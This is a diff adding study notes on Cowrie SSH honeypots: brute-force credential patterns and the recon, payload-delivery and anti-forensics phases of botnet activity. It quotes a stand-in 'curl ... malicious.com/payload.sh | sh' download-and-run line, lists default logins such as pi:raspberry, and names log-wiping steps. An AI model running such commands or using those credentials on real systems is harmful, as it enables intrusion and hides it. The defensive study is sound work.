@@ -65,9 +65,6 @@ Where a honeypot is placed dictates the type of threats it detects.
 * **Significance:** Because they are exposed, they are almost constantly under attack, collecting vast amounts of data on current tools and techniques used by botnets and indiscriminate attackers.
 
 
-Here is the hands-on exercise formatted for your Obsidian vault, complete with the connection details, the detection techniques, and designated spaces for your screenshots.
-
-
 # Cowrie Honeypot: The Adversary Perspective
 
 ## 1. Connecting to the Honeypot
@@ -155,4 +152,66 @@ For external or high-traffic honeypots, manual log parsing quickly becomes impos
     * **Live Monitoring:** Dashboards allow defenders to see attacks happening in real-time rather than just analyzing them historically.
     * **Alerting:** Can trigger immediate notifications for specific high-risk behaviors.
 
+# SSH Attack Surface & Brute-Force Analysis
 
+## 1. The SSH Attack Surface
+
+By default, Cowrie is configured to only expose the SSH service. Because a properly configured SSH installation has a very limited attack surface, adversaries are almost exclusively forced to rely on **brute-force attacks** to gain entry.
+
+* **The Reality of Exposure:** If you expose SSH to the public internet, it is not a matter of *if* you will be attacked, but *when*. Automated botnets constantly scan the IPv4 space looking for open port 22.
+* **Standard Defenses:** Defending against these attacks in the real world is straightforward:
+    * Disable password authentication entirely in favor of **Public-Key Authentication (PKI)**.
+    * If passwords must be used, enforce complex, high-entropy passwords and implement tools like `fail2ban` to block repeated failed attempts.
+
+---
+
+## 2. Analyzing Common Attacker Credentials
+
+To understand what these automated botnets are actually trying, the demo machine contains a curated list of the **200 most common credentials** captured by historical Cowrie deployments. 
+
+**Common Patterns in the Data:**
+When analyzing honeypot credential logs, you will notice distinct trends indicating what attackers are optimizing for:
+* **Extremely Weak Passwords:** Standard dictionary words and simple combinations.
+* **Keyboard Walks:** Sequential keys like `123456`, `qwerty`, or `asdfgh`.
+* **Default IoT/Device Credentials:** Attackers heavily target unconfigured devices connected to the internet. You will frequently see default logins for devices like:
+    * **Raspberry Pi:** (`pi:raspberry`)
+    * **Volumio Jukebox:** (`volumio:volumio`)
+    * Standard default router logins (`admin:admin`, `root:root`).
+
+# Typical Post-Exploitation Activity (Botnets)
+
+**Tags:** #PostExploitation #Botnets #Reconnaissance #MalwareAnalysis #AntiForensics
+**Date Logged:** 2026-02-22
+
+---
+
+## 1. The Automated Attack Pattern
+
+Once a bot successfully brute-forces an SSH login, the subsequent actions are almost entirely automated. Because these bots operate via pre-written scripts, their post-exploitation behavior follows a highly predictable, broad pattern that defenders can analyze.
+
+---
+
+## 2. The Three Phases of Bot Behavior
+
+Generally, an automated bot will immediately execute a combination of the following three phases upon gaining access:
+
+### Phase 1: System Reconnaissance
+The bot needs to figure out what kind of system it just compromised to determine if its payload will work.
+* **Common Commands:** `uname` (kernel info), `nproc` (number of processing units).
+* **Target Files:** Reading `/etc/issue` (OS version) and `/proc/cpuinfo` (hardware architecture).
+* **The Defender Advantage:** In Cowrie, you can modify the contents of these specific files to trick the bot into thinking it breached a high-end enterprise server, or even a vulnerable IoT device like a smart toaster.
+
+<img width="741" height="125" alt="image" src="https://github.com/user-attachments/assets/00826914-0f1d-4972-ac4e-2e8d3345c6cf" />
+
+
+### Phase 2: Payload Delivery & Installation
+Once the bot confirms the system architecture, it attempts to pull down its primary malicious payload.
+* **Common Tools:** `wget`, `curl`, and occasionally `ftp`.
+* **Execution Method:** Bots typically pipe a remote shell script directly into bash (e.g., `curl http://malicious.com/payload.sh | sh`).
+* **The Payload:** The vast majority of these automated scripts are designed to install cryptocurrency miners.
+* **The Defender Advantage:** Cowrie safely intercepts this process. It will successfully download a copy of the malicious file for you to analyze, but it completely prevents the script from actually executing.
+
+### Phase 3: Anti-Forensics (Covering Tracks)
+To maintain persistence and hide from system administrators, a subset of bots will attempt to clean up after themselves.
+* **Common Actions:** Deleting system logs in `/var/log` and disabling or clearing the `~/.bash_history` file.
+* **The Defender Advantage:** This is entirely ineffective in a honeypot. Because Cowrie logs all keystrokes and session data externally (outside the simulated environment), the attacker cannot delete the actual logs of their activity.
